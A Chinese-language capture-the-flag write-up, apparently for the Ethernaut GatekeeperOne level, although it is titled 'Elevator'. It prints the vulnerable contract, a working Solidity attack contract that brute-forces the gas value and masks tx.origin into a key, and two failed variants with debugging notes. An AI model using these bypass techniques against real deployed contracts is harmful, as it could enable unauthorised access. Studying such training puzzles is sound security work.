# 11 - Elevator

## 题目
攻击以下合约
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

## 解题
本题考察几点： 
第一关：通过使用合约调用 enter 函数来满足。
第二关：我们使用一个循环来尝试不同的 gas 值，直到找到正确的值。8191 * 3 是一个基础值，我们在此基础上微调。
第三关：构造 key 的逻辑如下：
uint64(uint160(tx.origin)) 获取调用者地址的后 8 字节。
& 0xFFFFFFFF0000FFFF 确保 key 的第 3 和第 4 字节为 0，满足条件 1 和 2。
最后 2 字节与 tx.origin 的最后 2 字节相同，满足条件 3。

攻击合约如下
```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface GatekeeperOne {
    function enter(bytes8) external  returns (bool);
}

contract hackGatekeeperOne {
    GatekeeperOne Gatekeepercontract ;
    constructor(address addr) {
        Gatekeepercontract = GatekeeperOne(addr);
    }

    function hack() public {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 300; i++) {
        try Gatekeepercontract.enter{gas: i + (8191 * 3)}(key) returns (bool res){
            if (res) {
                break;
            }
            // return res;
        }catch { }

    }
}}
```
部署就解决，但是遇到几个问题，记录如下:
下面的合约写法不知何故，会报错：transact to GatePassOne.enterGate errored: Error occurred: invalid opcode.
```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

contract GatePassOne {
    event Entered(bool success);

    function enterGate(address _gateAddr) public returns (bool) {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;

        bool succeeded = false;

        for (uint i = (8191 * 3) - 604; i < ((8191 * 3) + 604); i++) {
          (bool success, ) = address(_gateAddr).call{gas:i}(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
```
以及下面这段代码没有用try导致只能运行第一遍，第一个合约使用 try-catch 结构。这允许它在失败时继续尝试，而不会因为一次失败就终止整个交易。

而下面函数直接调用 enter 函数。如果调用失败，整个交易将回滚，停止进一步的尝试。
```solidity
           for (uint256 i = 0; i < 1500; i++) {
            bool success = Gatekeepercontract.enter{gas: i + (8191 * 3)}(key);
            if (success) {
                break;
            }
        }
```